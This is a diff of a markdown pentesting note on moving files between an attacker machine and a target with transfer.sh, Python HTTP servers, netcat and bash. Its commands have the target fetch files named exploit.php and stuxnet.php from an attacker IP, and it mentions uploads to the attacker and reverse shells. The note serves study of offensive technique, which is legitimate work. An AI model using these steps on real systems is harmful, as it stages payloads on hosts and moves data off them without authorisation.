@@ -7,9 +7,10 @@ readingTime: 5 mins
 ---
 
 # Transfering Files
+----------------------------------
 
 # **#1 Curl's Transfer.sh Utility**
-Cur's Transfer.sh Utility, and will upload it to a specific transfer.sh server. It's relatively new but for me has worked everywhere. I like it because you do not need to mess with checking IP addresses, Ngrok, if you are in/out network, etc. It works 100% of the time, regardless of any of that. It will give you a sharable web page, QR code, and as soon as you finish the upload a link for that. You can also just use that link to make a curl request and download the file, which is what I typically do. 
+My favorite(oddly for some reason) is Curl's Transfer.sh Utility. It's relatively new but for me has worked everywhere. It will upload it to a specific transfer.sh server. I like it because you do not need to mess with checking IP addresses, Ngrok,  being in or out of network, etc. It works 100% of the time, regardless of any of that. It will give you a sharable web page, QR code, and as soon as you finish the upload a link for that. You can also just use that link to make a curl request and download the file, which is what I typically do. 
 
 The following command uploads the file to the transfer.sh servers...
 
@@ -24,12 +25,14 @@ To download the file on the client side, enter the following command...
 `curl https://transfer.sh/<CodeFromAbove>/Myfile.txt -o Myfile.txt`
 
 ***-o for output, can be named anything.***
+----------------------------------
 
 # **#2 Python**
 Python is the next easiest for me, just out of familiarity. Python3 specifically but both are easy.
 
 *Anything written in python2 will almost always break in python3. So we also look at how to transfer a file using python3.*
 
+----------------------------------
 ## **Python3**
 
 In the case of python3, enter the following command to start a simple python server...
@@ -42,6 +45,7 @@ To download the file on the target, enter the following command...
 
 `wget http://192.168.43.177:8080/exploit.php`
 
+----------------------------------
 ## **Python2**
 ----------
 Switch to the directory where the file that you want to transfer exists. Start a simple python server. Enter the following command...
@@ -52,6 +56,7 @@ Now go to the machine where you want to transfer the file. Use the following com
 
 `wget http://192.168.43.177:8080/stuxnet.php`
 
+----------------------------------
 # #3 Netcat
 Netcat has always been an easy option for trasnfering and just about anything else.
 
@@ -68,6 +73,7 @@ Now go to the target machine and enter the following to download the file...
 
 `nc -nv 192.168.43.177 8080 > stuxnet.php`
 
+----------------------------------
 # #4 Bash Upload
 **I've never really used this method. Transfer.sh, Python, and Netcat work perfectly so I've never needed this. I have used similiar bash commands for reverse shells.**
 ### **Upload file over HTTP (require HTTP service running on the attacker machine)below...**
